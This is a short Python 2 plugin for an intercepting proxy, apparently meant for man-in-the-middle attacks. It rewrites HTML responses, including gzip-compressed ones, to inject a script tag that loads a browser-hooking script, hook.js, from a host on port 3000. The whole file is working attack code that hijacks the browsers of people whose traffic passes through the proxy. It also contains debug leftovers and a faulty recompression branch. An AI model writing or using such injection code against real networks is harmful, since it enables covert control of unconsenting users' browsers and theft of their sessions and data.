import subprocess
import re
import pdb
import zlib
from cStringIO import StringIO
from gzip import GzipFile

#TODO: The UTF-8 encoding might not be 101% kosher all the time
def proxy_mangle_response(res):
    v = res.getHeader("Content-Type")
    print res.getHeader("Content-Encoding")
    inject_string = "<script src='http://10.1.1.1:3000/hook.js'></script>"
    try:
        res.setHeader("Content-Length",int(res.getHeader("Content-Length")[0])+len(inject_string))
    except:
        print "no content length"

    #pdb.set_trace()
    if len(v) > 0 and "text/html" in v[0] and len(res.getHeader("Content-Encoding")) == 0:
	        print "Text/HTML Interception"
		result = re.sub("(?i)<head>","<head>"+inject_string,res.body)
		res.body = result
		#res.body = res.body + "FUCKING HELLO"
		print "Injected"
    elif len(v) > 0 and "text/html" in v[0]:
	print "Compression Stream Detected"
	try:
		decomp = zlib.decompress(res.body,16+zlib.MAX_WBITS)
		result = re.sub("(?i)<head>","<head>"+inject_string,decomp)
		res.body = zlib.compress(result,16+zlib.MAX_WBITS)
		print "Decompressed GZIP Stream w/Method 1"
		print "Injected"
	except:
		try:
	        	data2 = GzipFile('', 'r', 0, StringIO(res.body)).read()
			result = re.sub("(?i)<head>","<head>"+inject_string,data2)
			res.body = GzipFile('','w',0,StringIO(result)).write()
			print "Decompressed GZIP stream w/Method 2"
			print "Injected"
			
		except:
			print "Failed to decompress GZIP stream. Passing..."
			print "Inject Failed"
			res.body = res.body + inject_string
			pass
	return res
